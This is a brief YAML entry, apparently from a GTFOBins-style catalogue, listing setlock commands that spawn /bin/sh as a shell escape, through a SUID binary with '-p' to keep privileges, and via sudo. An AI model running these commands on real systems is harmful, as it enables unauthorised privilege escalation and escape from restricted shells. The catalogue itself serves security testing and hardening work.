---
functions:
  shell:
    - code: |
        TF=$(mktemp)
        setlock $TF /bin/sh
  suid:
    - code: ./setlock - /bin/sh -p
  sudo:
    - code: sudo setlock - /bin/sh
---
